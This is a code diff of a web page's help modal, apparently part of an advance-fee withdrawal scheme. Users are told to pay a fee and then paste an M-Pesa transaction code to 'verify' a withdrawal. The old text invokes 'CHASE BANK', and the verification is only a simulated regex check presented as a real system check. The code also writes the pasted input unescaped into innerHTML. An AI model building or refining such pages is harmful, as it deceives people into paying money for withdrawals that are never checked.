@@ -807,7 +807,7 @@
             </div>
         </div>
     </div>
-  <!-- Help Modal -->
+   <!-- Help Modal -->
 <div id="helpModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
   <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full p-6">
     <div class="flex justify-between items-center mb-4">
@@ -818,7 +818,9 @@
     </div>
 
     <p class="text-sm text-gray-600 mb-4">
-      Paste your M-Pesa transaction code below to verify withdrawal .check your phone with message from CHASE BANK.
+      Paste your M-Pesa transaction code below to verify your withdrawal. 
+      Check your phone for the confirmation SMS from M-Pesa .after fee payment is done. eg THV5SCFSUH.
+      only valid codes and current codes are allowed by system.invalid are rejected.
     </p>
 
     <input 
@@ -829,6 +831,7 @@
     >
 
     <div id="helpResult" class="text-sm mt-2"></div>
+ 
 
     <div class="flex space-x-3 mt-6">
       <button onclick="closeHelpModal()" class="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50">
@@ -1616,13 +1619,13 @@ function checkMpesaCode() {
     const resultBox = document.getElementById('helpResult');
 
     if (!code) {
-        resultBox.innerHTML = `<p class="text-red-600">⚠️ Please enter a code.</p>`;
+        resultBox.innerHTML = `<p class="text-red-600">⚠️ Please enter a valid  code.</p>`;
         return;
     }
 
     // For now, simulate checking (replace with real API later)
     if (/^[A-Z0-9]{10,}$/i.test(code)) {
-        resultBox.innerHTML = `<p class="text-green-600 font-medium">✅ Code ${code} looks valid. Processing check...</p>`;
+        resultBox.innerHTML = `<p class="text-green-600 font-medium">✅ correct Code format ${code} looks valid. Processing check for validility please wait...</p>`;
     } else {
         resultBox.innerHTML = `<p class="text-red-600">❌ Invalid code or formart. Please try again.</p>`;
     }
